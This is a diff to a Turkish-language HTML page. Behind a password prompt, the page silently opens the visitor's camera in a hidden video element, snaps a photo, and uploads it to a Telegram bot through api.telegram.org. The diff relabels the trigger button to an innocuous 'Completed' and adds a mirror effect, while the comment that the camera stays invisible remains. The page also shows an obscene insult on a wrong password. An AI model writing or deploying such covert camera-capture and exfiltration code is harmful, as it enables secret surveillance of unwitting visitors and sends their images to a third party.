@@ -16,34 +16,39 @@
       height: 100vh;
       text-align: center;
     }
+
     #hataMesaji {
       display: none;
       font-size: 28px;
       color: red;
       animation: yanipSonme 0.5s infinite;
     }
+
     @keyframes yanipSonme {
       0%, 100% { opacity: 1; }
       50% { opacity: 0; }
     }
-    #ayikOl, #nahGonder {
+
+    #ayikOl, #tamamlandi {
       display: none;
     }
+
     #ayikOl {
       font-size: 60px;
       color: red;
       margin-bottom: 10px;
     }
+
     button {
       font-size: 18px;
       padding: 10px 20px;
       margin-top: 20px;
       cursor: pointer;
     }
+
     video {
-      display: none; /* KAMERA GÖRÜNMEYECEK */
-      width: 0;
-      height: 0;
+      display: none;
+      transform: scaleX(-1); /* Ayna yansıması efekti */
     }
   </style>
 </head>
@@ -61,7 +66,7 @@
   <div id="hataMesaji">Senin kafatasını sikeyim şifreyi girmeyi bile beceremedin.</div>
 
   <video id="kamera" autoplay playsinline muted></video>
-  <button id="nahGonder" onclick="fotoGonder()">Nah Gönder</button>
+  <button id="tamamlandi" onclick="fotoGonder()">Tamamlandı</button>
   <div id="gonderildi" style="display:none; margin-top:10px; color:lightgreen;">📸 Gönderildi!</div>
 
   <script>
@@ -73,9 +78,9 @@
       if (sifre === "671300") {
         document.getElementById("girisEkrani").style.display = "none";
         document.getElementById("ayikOl").style.display = "block";
-        document.getElementById("nahGonder").style.display = "inline-block";
+        document.getElementById("tamamlandi").style.display = "inline-block";
 
-        // Kamera aç ama gösterme
+        // Kamera aç ama görünmesin, ayna efekti aktif
         const video = document.getElementById('kamera');
         navigator.mediaDevices.getUserMedia({ video: true })
           .then(stream => {
@@ -97,18 +102,22 @@
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
+
+      // Ayna etkisi için ters çevirerek çiziyoruz
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       canvas.toBlob(blob => {
         const formData = new FormData();
         formData.append("chat_id", chatId);
-        formData.append("photo", blob, "nah.jpg");
+        formData.append("photo", blob, "kamera.jpg");
 
         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
           method: "POST",
           body: formData
         }).then(() => {
-          document.getElementById("nahGonder").style.display = "none";
+          document.getElementById("tamamlandi").style.display = "none";
           document.getElementById("gonderildi").style.display = "block";
         }).catch(err => {
           console.error("Foto gönderilemedi:", err);
